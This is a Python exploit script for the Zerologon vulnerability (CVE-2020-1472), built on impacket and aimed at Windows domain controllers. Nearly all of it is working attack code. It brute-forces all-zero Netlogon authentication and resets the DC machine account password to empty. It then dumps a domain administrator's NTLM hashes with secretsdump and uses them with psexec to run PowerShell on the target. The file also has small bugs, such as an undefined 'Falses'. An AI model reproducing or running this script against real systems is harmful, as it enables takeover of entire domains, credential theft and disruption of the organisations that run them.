#!/usr/bin/env python3
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRENUM, NDRUNION, NDRPOINTER, NDRUniConformantArray
from impacket.dcerpc.v5 import nrpc, epm, lsat, lsad
from impacket.dcerpc.v5.dtypes import NULL, WSTR, LPWSTR, DWORD, ULONG, USHORT, PGUID, NTSTATUS, LONG, UCHAR, PRPC_SID, \
    GUID, RPC_UNICODE_STRING, SECURITY_INFORMATION, LPULONG, MAXIMUM_ALLOWED
from impacket.dcerpc.v5 import transport
import argparse
from impacket import crypto
from impacket.smbconnection import SMBConnection
from struct import pack, unpack
import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call
import reg
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
def update_authenticator(cSC, sK, timestamp):
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = timestamp
    return authenticator

def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
  flags = 0x212fffff

  # Send challenge and authentication request.
  resp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  serverChallenge = resp['ServerChallenge']

  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )
    # It worked!
    assert server_auth['ErrorCode'] == 0
    return rpc_con, serverChallenge

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None, None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    raise ex
    fail(f'Unexpected error: {ex}.')


#def getDomainSidRpc()

def perform_attack(options):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  conn = SMBConnection(options.target, options.target, None, options.port)
  conn.login('','')
  dc_handle = f"\\\\{conn.getServerName()}"
  target_computer = conn.getServerName()
  dc_ip = options.target

   
  print(dc_ip)
  print(target_computer)
  for attempt in range(0, MAX_ATTEMPTS):
    rpc_con, serverChallenge = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    if rpc_con == None:
        print('=', end='', flush=True)
    else:
        break
  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
    plaintext = b'\x00' * 8
    sessionKey = nrpc.ComputeSessionKeyStrongKey('', plaintext, serverChallenge, None)
    ppp = nrpc.ComputeNetlogonCredential(plaintext, sessionKey)
    clientStoredCredential = pack('<Q', unpack('<Q', ppp)[0] + 10)
    print()
    blah = nrpc.hNetrServerPasswordSet2(
        rpc_con, dc_handle + '\x00',
        target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
        target_computer + '\x00',
        update_authenticator(clientStoredCredential, sessionKey, 0), b'\x00' * 516
    )
    blah.dump()
#    stringbinding = epm.hept_map(options.target, lsat.MSRPC_UUID_LSAT, protocol="ncacn_ip_tcp")
#    rpc_con = transport.DCERPCTransportFactory(stringbinding).get_dce_rpc()
#    rpc_con.connect()
#    rpc_con.bind(lsat.MSRPC_UUID_LSAT)
#    resp = lsad.hLsarOpenPolicy2(rpc_con, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
#    sid = lsad.hLsarQueryInformationPolicy2(rpc_con, resp['PolicyHandle'], lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)['PolicyInformation']['PolicyPrimaryDomainInfo']['Sid'].formatCanonical()
#    print(sid)
    if options.silver:
        exit()
    import secretsdump, psexec
    class SDOptions:
        def __init__(self):
            self.use_vss = False
            self.target_ip = dc_ip
            self.outputfile = '/tmp/dumped.tmp'
            self.hashes = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
            self.exec_method = "smbexec"
            self.just_dc = True
            self.just_dc_ntlm = True
            self.just_dc_user = options.target_da
            self.pwd_last_set = self.user_status = self.resumefile = \
            self.k = self.history = self.ntds = self.sam = self.security = \
            self.system = self.aesKey = self.bootkey = None
            self.dc_ip = dc_ip
    class PSOptions:
        def __init__(self):
            self.help = Falses
#    h = SMBConnection(options.target, options.target, None, options.port)
#    if options.target_machine:
#        h.login(options.target_machine + "$", '')
#    else:
#        h.login(target_computer + '$', '')
    secretsdump.DumpSecrets(dc_ip, target_computer+'$', '', '', SDOptions()).dump()

    f= open("/tmp/dumped.tmp.ntds").read()
#    print(f)
    hashes = ':'.join(f.split(':')[2:-3])
    print(hashes)
    psexec = psexec.PSEXEC('powershell.exe -c Reset-ComputerMachinePassword', None, None, None, hashes=hashes, username=options.target_da, serviceName='fucked')
    psexec.run(options.target, dc_ip)
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  parser = argparse.ArgumentParser(add_help=True, description="Exploits a domain controller that is vulnerable to the Zerologon attack (CVE-2020-1472).")
  parser.add_argument('target', action='store', help='<resolvable hostname or address>')
  parser.add_argument('-silver', action='store_true', help='Compromise target by delegating a ticket using the machine account\'s hash)')
  parser.add_argument('-target_da', action='store', help="Specify a known target domain administrator")
  parser.add_argument('-port', type=int, choices={445, 139}, default=445, help="SMB port (default: 445)")
  parser.add_argument('-target_machine', action='store', help="Specify a machine to target")
  options = parser.parse_args()
  if len(sys.argv) == 1:
      parser.print_help()
  else:
    print(options)
    if not options.target_da:
        options.target_da = "Administrator"
#    if not options.target_machine:
#        options.target_machine = options.target
#    input("::")
    #dc_name = dc_name.rstrip('$') 
    perform_attack(options)

